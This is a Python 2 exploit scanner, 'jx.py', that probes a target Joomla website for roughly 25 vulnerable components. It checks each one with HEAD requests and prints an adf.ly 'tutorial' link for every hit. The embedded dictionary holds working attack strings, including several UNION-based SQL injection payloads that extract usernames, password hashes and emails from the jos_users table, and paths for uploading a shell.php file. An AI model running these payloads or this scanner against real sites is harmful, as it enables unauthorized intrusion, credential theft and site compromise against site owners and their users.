#!/usr/bin/python

import sys
import urllib2
import re
import time
import httplib
import random

# Color Console
W  = '\033[0m'  # white (default)
R  = '\033[31m' # red
G  = '\033[1;32m' # green bold
O  = '\033[33m' # orange
B  = '\033[34m' # blue
P  = '\033[35m' # purple
C  = '\033[36m' # cyan
GR = '\033[37m' # gray

#Bad HTTP Responses 
BAD_RESP = [400,401,404]

def main(path):
    print "[+] Testing:",host.split("/",1)[1]+path
    try:
        h = httplib.HTTP(host.split("/",1)[0])
        h.putrequest("HEAD", "/"+host.split("/",1)[1]+path)
        h.putheader("Host", host.split("/",1)[0])
        h.endheaders()
        resp, reason, headers = h.getreply()
        return resp, reason, headers.get("Server")
    except(), msg: 
        print "Error Occurred:",msg
        pass

def timer():
    now = time.localtime(time.time())
    return time.asctime(now)

def slowprint(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush() # defeat buffering
        time.sleep(8./90)

print

xpls = { "images/artforms/attachedfiles/" : ["com_artforms","http://adf.ly/e3nes"],"index.php?option=com_fabrik&c=import&view=import&filetype=csv&table=1" : ["com_fabrik","http://adf.ly/e3luV"] , "index.php?option=com_idoblog&task=profile&Itemid=1337&userid=62+union+select+1,2,concat%28username,0x3a,password,0x3a,email%29,4,5,6,7,8,9,10,11,12,13,14,15,16+from+jos_users--" : ["com_idoblog","http://adf.ly/e3m65"], "index.php?option=com_ignitegallery&task=view&gallery=-4+union+all+select+1,2,group_concat(id,0x3a,name,0x3a,username,0x3a,email,0x3a,password,0x3a,usertype),4,5,6,7,8,9,10+from+jos_users--" : ["com_ignitegallery","http://adf.ly/e3nA7"], "administrator/components/com_maian15/charts/php-ofc-library/ofc_upload_image.php?name=shell.php" : ["com_maian15","http://adf.ly/e3kzf"], "administrator/components/com_maianmedia/charts/php-ofc-library/ofc_upload_image.php?name=shell.php" : ["com_maianmedia","http://adf.ly/e3l6O"] , "index.php?option=com_media&view=images&tmpl=component&fieldid=&e_name=jform_articletext&asset=com_content&author=&folder=" : ["com_media","http://adf.ly/e3lf7"], "administrator/components/com_redmystic/chart/tmp-upload-images/" : ["com_redmystic","http://adf.ly/e3lFf"], "index.php?option=com_users&view=registration" : ["com_user","http://adf.ly/e3lYt"], "index.php?option=com_jce" : ["JCE","link"] , "index.php?option=com_user&view=reset&layout=confirm" : ["com_user 2","http://adf.ly/e3kv0"] , "index.php?option=com_shohada&view=shohada" : ["com_shohada","http://adf.ly/e3kr3"], "index.php?option=com_smartformer" : ["com_smartformer","http://adf.ly/e3pI9"], "index.php?option=com_garyscookbook&func=newItem" : ["com_garyscookbook","http://adf.ly/e3rXR"],"index.php/component/osproperty/?task=agent_register" : ["com_osproperty","http://adf.ly/e3sVO"], "index.php?option=com_acymailing&gtask=archive&listid=" : ["com_acymailing [SQLi]","http://adf.ly/e4sYn"], "index.php?option=com_extplorer&action=show_error&dir=" : ["com_extplorer","http://adf.ly/e4tiP"] , "index.php?option=com_xmap&tmpl=component&Itemid=999&view=" : ["com_xmap" , "http://adf.ly/e4vV1"] , "index.php?option=com_content&task=blogcategory&id=60&Itemid=99999%20union%20select%201,concat_ws(0x3a,username,password),3,4,5%20from%20jos_users/*" : ["com_content [SQLi]" , "http://adf.ly/e4wKe"] , "/index.php?option=com_flippingbook&Itemid=28&book_id=null/**/union/**/select/**/null,concat(username,0x3e,password),null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null/**/from/**/jos_users/*" : ["com_flippingbook [SQLi]" , "http://adf.ly/e4wUM"] , "index.php?option=com_phocagallery&view=categories&Itemid=" : ["com_phocagallery" , "http://adf.ly/e4wlq"] , "index.php?option=com_lyftenbloggie&author=62+union+select+1,concat_ws(0x3a,username,password),3,4,@@version,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30+from+jos_users--" : ["com_lyftenbloggie [SQLi]" , "http://adf.ly/e4wzk"] , "index.php?option=com_wrapper&view=wrapper&Itemid=":["com_wrapper","http://adf.ly/e4xjq"] , "index.php?option=com_fireboard&Itemid=":["com_fireboard","http://adf.ly/e4yf8"], "j/index.php?option=com_mailto&tmpl=component&template=beez_20&link=":["com_mailto [SPAM]","http://adf.ly/e4yyi"]}

if len(sys.argv) != 2:
    print "\nUsage: python jx.py <site>"
    print "Example: python jx.py www.site.com/\n"
    sys.exit(1)

host = sys.argv[1].replace("http://","").rsplit("/",1)[0]
if host[-1] != "/":
    host = host+"/"
    
print "\n[+] Target:",host
print "[+] Exploit Loaded:",len(xpls) 

print "\n[+] Scanning Exploit\n"
for xpl,(poc,expl) in xpls.items():
    resp,reason,server = main(xpl)
    if resp not in BAD_RESP:
        print ""
        print G+"\t[+] Result:",resp, reason
        print G+"\t[+] Exploit:",poc
        print G+"\t[+] Tutorial:",expl
        print W
    else:
        print ""
        print R+"\t[-] Result:",resp, reason
        print W
print "\n[-] Done\n"
